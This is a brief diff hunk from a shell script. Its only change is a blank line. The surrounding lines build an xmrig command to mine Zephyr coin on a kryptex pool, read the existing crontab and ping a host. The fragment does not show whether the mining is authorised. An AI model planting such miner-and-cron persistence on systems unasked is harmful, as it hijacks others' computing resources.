@@ -18,6 +18,7 @@ command="./xmrig --coin zephyr --url \"zeph.kryptex.network:8888\" --user \"$wal
 existing_crontab=$(crontab -l 2>/dev/null)
 
 
+
 ping -c 4 $HOST > /dev/null
 
 if [ $? -eq 0 ]; then
